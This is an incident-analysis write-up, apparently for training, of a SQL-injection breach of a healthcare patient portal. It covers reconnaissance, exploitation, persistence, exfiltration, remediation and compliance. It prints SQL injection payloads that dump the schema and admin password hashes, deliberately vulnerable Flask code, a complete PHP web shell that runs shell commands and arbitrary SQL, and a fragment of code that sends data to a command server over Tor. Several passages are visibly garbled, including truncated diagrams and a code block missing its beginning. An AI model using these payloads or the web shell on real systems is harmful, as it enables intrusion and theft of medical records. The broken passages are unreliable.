## Attack Vector Analysis

### Phase 1: Reconnaissance (Days 1-14)

**Attacker Activities**:
- Automated vulnerability scanning
- Directory enumeration
- SQL injection detection
- Technology fingerprinting
- User enumeration

**Evidence Found**:
```log
[2024-07-06 08:23:15] GET /search?query=' OR '1'='1 - Status: 200
[2024-07-06 08:23:47] GET /search?query=' UNION SELECT NULL-- - Status: 200
[2024-07-06 08:24:12] GET /search?query=' UNION SELECT NULL,NULL-- - Status: 200
[2024-07-06 08:24:35] GET /search?query=' UNION SELECT NULL,NULL,NULL-- - Status: 200
[2024-07-06 08:25:01] GET /search?query=' UNION SELECT version(),NULL,NULL-- - Status: 200
```

### Phase 2: Initial Compromise (Day 15)

**Vulnerability Exploited**: SQL Injection in search functionality

**Vulnerable Code**:
```python
# search.py - Vulnerable implementation
@app.route('/search')
def search_patients():
    query = request.args.get('query', '')
    
    # VULNERABILITY: String concatenation, no sanitization
    sql = f"""
        SELECT patient_id, first_name, last_name, date_of_birth, ssn
        FROM patients 
        WHERE first_name LIKE '%{query}%' 
           OR last_name LIKE '%{query}%'
    """
    
    cursor = db.cursor()
    cursor.execute(sql)  # No parameterization!
    results = cursor.fetchall()
    
    return jsonify(results)
```

**Exploit Payload**:
```sql
' UNION SELECT 
    table_name, column_name, data_type, NULL, NULL 
FROM information_schema.columns 
WHERE table_schema = 'public'--
```

**What This Revealed**:
- Complete database schema
- Table names and relationships
- Column names (including sensitive fields)
- Data types

### Phase 3: Data Enumeration (Days 15-20)

**Attacker Actions**:
- Mapped entire database structure
- Identified high-value tables
- Located admin credentials table
- Found backup file locations

**Database Structure Discovered**:
```mermaid
erDiagram
    PATIENTS ||--o{ MEDICAL_RECORDS : has
    PATIENTS ||--o{ PRESCRIPTIONS : receives
    PATIENTS ||--o{ LAB_RESULTS : has
    PATIENTS ||--o{ INSURANCE : has
    USERS ||--o{ AUDIT_LOGS : generates
    USERS {
        int user_id PK
        string email
        string password_hash
        string role
        boolean is_admin
    }
    PATIENTS {
        int patient_id PK
        string ssn
        string first_name
        string last_name
        date date_of_birth
        string address
        string phone
    }
```

**Sensitive Tables Found**:
```sql
-- Via SQL Injection
' UNION SELECT 
    COUNT(*), 'patients', NULL, NULL, NULL 
FROM patients 
UNION SELECT 
    COUNT(*), 'medical_records', NULL, NULL, NULL 
FROM medical_records
UNION SELECT 
    COUNT(*), 'users', NULL, NULL, NULL 
FROM users--

-- Results revealed:
-- patients: 2,500,000 records
-- medical_records: 8,750,000 records  
-- users: 5,200 records (including 42 admins)
```

### Phase 4: Privilege Escalation (Day 21)

**Admin Credential Theft**:

The attacker extracted password hashes using SQL injection:

```sql
' UNION SELECT 
    user_id, email, password_hash, role, is_admin::text
FROM users 
WHERE is_admin = true--
```

**Extracted Admin Accounts** (42 accounts):
- 38 accounts: Strong passwords, MFA enabled
- 4 accounts: Weak passwords, no MFA
- 1 account: Reused password from previous breach

**Compromised Account**:
```
Email: admin.legacy@healthportal.com
Role: Database Administrator
Created: 2018 (6 years old, forgotten account)
Password: HealthPortal2018! (cracked in 4 hours via rainbow table)
MFA: Not enrolled
Last Login: 2019 (dormant account)
```

**Attack Technique**:
```mermaid

    C --> E[Dictionary Attack]
    D --> F[Password Cracked]
    E --> F
    F --> G[Login to Admin Panel]
    G --> H[Direct Database Access]
```

### Phase 5: Persistence (Day 22)

**Backdoor Installation**:

Once inside the admin panel, the attacker uploaded a web shell:

```php
<?php
// Backdoor: shell.php (disguised as image upload)
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    
    // Execute system commands
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

// Database direct access
if (isset($_REQUEST['sql'])) {
    $sql = $_REQUEST['sql'];
    
    // Direct database query execution
    $conn = pg_connect("host=localhost dbname=healthportal user=admin password=admin123");
    $result = pg_query($conn, $sql);
    
    echo "<pre>";
    while ($row = pg_fetch_assoc($result)) {
        print_r($row);
    }
    echo "</pre>";
}
?>
```

**Backdoor Location**:
```
/var/www/healthportal/public/uploads/images/profile_2024_07_28_1234.php
```

**Persistence Mechanisms**:
- Web shell disguised as image file
- Scheduled cron job for re-installation
- SSH key added to admin user
- Database user with elevated privileges created

### Phase 6: Data Exfiltration (Days 23-50)

**Staged Extraction Strategy**:

The attacker avoided detection by:
- Small, incremental exports (50,000 records per day)
- Exports during off-peak hours (2-4 AM UTC)
- Using legitimate-looking admin queries
- Encrypting data before transfer
- Using Tor network for exfiltration

    )
    
    data = response.text
    
    # Encrypt data
    encrypted = encrypt_aes(data)
    
    # Exfiltrate via Tor
    send_to_command_server(encrypted)
    
    return len(data)

# Gradual exfiltration

- No patch management for application code

**Access Management**:
- No regular access reviews
- Dormant accounts not disabled (6-year-old account compromised)
- No privileged access management (PAM)
- Shared admin credentials
- No just-in-time (JIT) access

**Incident Response**:
- No incident response plan
- No incident response team
- Detection relied on external notification
- No tabletop exercises
- Communication plan not prepared

#### 4. Compliance Failures

**HIPAA Requirements Not Met**:
- Risk assessment outdated (3 years old)
- Technical safeguards incomplete
- Audit controls inadequate
- Workforce training insufficient
- Business Associate Agreements not updated

**SOC 2 Compliance**:
- Type I only (point-in-time)
- Controls not continuously monitored
- Exceptions not tracked
- Evidence collection gaps

   ```sql
   -- Identify all accessed records
   SELECT DISTINCT patient_id, access_time, accessing_user
   FROM audit_logs
   WHERE access_time BETWEEN '2024-07-06' AND '2024-08-22'
     AND accessing_user IN ('admin.legacy@healthportal.com', 'backdoor_shell')
   ORDER BY access_time;
   
   -- Result: 2,547,892 unique patient_id values accessed
   ```

3. **Compromised Data Catalog**
   - Complete list of affected patients
   - Types of data accessed per patient
   - Sensitivity classification
   - Regulatory notification requirements

**Regulatory Notification** (see [../compliance.md](../compliance.md)):

1. **HIPAA Breach Notification** (60-day requirement)
   - Notified HHS OCR within 24 hours (voluntary expedited notification)
   - Submitted breach report with initial assessment
   - Filed media notification (>500 individuals)

2. **State Attorney General Notifications**
   - Notified AGs in all 50 states (multi-state breach)
   - Provided breach details and remediation plans

3. **GDPR Notification** (72-hour requirement)
   - Notified relevant EU supervisory authorities
   - 15,000 EU residents affected

**Patient Notification**:

### Medium-term Remediation (72 hours - 2 weeks)

**Technical Fixes**:

1. **Eliminate SQL Injection**

```python
# Fixed search implementation
from flask import request, jsonify
import psycopg2
from psycopg2 import sql

@app.route('/search')
def search_patients():
    query = request.args.get('query', '')
    
    # Input validation
    if not query or len(query) < 2:
        return jsonify({'error': 'Query too short'}), 400
    
    if len(query) > 100:
        return jsonify({'error': 'Query too long'}), 400
    
    # Parameterized query (CRITICAL FIX)
    cursor = db.cursor()
    cursor.execute("""
        SELECT patient_id, first_name, last_name, date_of_birth, 
               '[REDACTED]' as ssn  -- Data masking
        FROM patients 
        WHERE first_name ILIKE %s 
           OR last_name ILIKE %s
        LIMIT 100
    """, (f'%{query}%', f'%{query}%'))
    
    results = cursor.fetchall()
    
    # Audit log every search
    audit_log('PATIENT_SEARCH', {
        'user_id': current_user.id,
        'query': query,
        'results_count': len(results),
        'ip': request.remote_addr
    })
    
    return jsonify(results)
```

2. **Database Hardening**

```sql
-- Principle of least privilege
-- Create limited-privilege application user
CREATE USER app_readonly WITH PASSWORD 'strong_generated_password';

-- Grant only SELECT on necessary tables
GRANT SELECT ON patients (patient_id, first_name, last_name, date_of_birth) TO app_readonly;
GRANT SELECT ON medical_records (record_id, patient_id, record_date) TO app_readonly;

-- Revoke dangerous permissions
REVOKE ALL ON patients FROM app_user;
REVOKE ALL ON information_schema.tables FROM PUBLIC;

-- Implement Row-Level Security (RLS)
ALTER TABLE patients ENABLE ROW LEVEL SECURITY;

CREATE POLICY patient_access_policy ON patients
    FOR SELECT
    TO app_readonly
    USING (
        -- Only allow access through application logic
        current_setting('app.current_user_id')::int = patient_id
        OR current_user IN (SELECT user_id FROM authorized_staff)
    );

-- Encrypt sensitive columns
-- Using pgcrypto extension
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Add encrypted columns
ALTER TABLE patients ADD COLUMN ssn_encrypted BYTEA;

-- Migrate existing data
UPDATE patients 
SET ssn_encrypted = pgp_sym_encrypt(ssn, 'encryption_key_from_vault')
WHERE ssn IS NOT NULL;

-- Drop plaintext column after verification
ALTER TABLE patients DROP COLUMN ssn;

-- Create secure view with decryption for authorized users only
CREATE VIEW patients_secure AS
SELECT 
    patient_id,
    first_name,
    last_name,
    date_of_birth,
    CASE 
        WHEN current_user IN (SELECT user_id FROM authorized_staff)
        THEN pgp_sym_decrypt(ssn_encrypted, 'encryption_key_from_vault')
        ELSE 'XXX-XX-' || RIGHT(pgp_sym_decrypt(ssn_encrypted, 'encryption_key_from_vault'), 4)
    END as ssn
FROM patients;
```

3. **Web Application Firewall (WAF)** (see [../network_security.md](../network_security.md))

**Zero Trust Architecture** (see [../network_security.md](../network_security.md)):
```mermaid
graph TD
    A[User/Device] -->|Identity Verification| B[Identity Provider]
    B -->|Token| C[Policy Engine]
    C -->|Risk Assessment| D{Allow Access?}

```

**Principles**:
- Never trust, always verify
- Assume breach mentality
- Verify explicitly (device, user, location, etc.)
- Use least privilege access
- Segment access (microsegmentation)
- Log everything

## Conclusion

The HealthPortal data breach demonstrates how multiple security failures can combine to create catastrophic outcomes. The incident cost $18.7 million, affected 2.5 million patients, and resulted in significant regulatory penalties and reputational damage.

**Critical Success Factors for Prevention**:

1. **Secure by Design**: Build security into applications from the start
2. **Defense in Depth**: Multiple layers of security controls
3. **Continuous Monitoring**: Detect anomalies before they become breaches
4. **Investment in Security**: Adequate resources for people, process, and technology
5. **Security Culture**: Everyone responsible for security, not just security team
6. **Compliance Plus**: Go beyond minimum compliance requirements
7. **Continuous Improvement**: Regular assessments, testing, and updates

**The Cost of Inaction**:

The breach cost HealthPortal $18.7 million, but the preventive measures would have cost approximately $2 million:
- WAF deployment: $200,000
- SIEM implementation: $500,000
- Database encryption: $300,000
- Security team expansion: $800,000 (annual)
- Training and awareness: $100,000
- Penetration testing: $100,000

   - Continuous monitoring and detection
   - Regular security testing

3. **Operational Discipline**
   - Secure SDLC processes

   - Incident response readiness
   - Regular access reviews

4. **Compliance as Baseline**
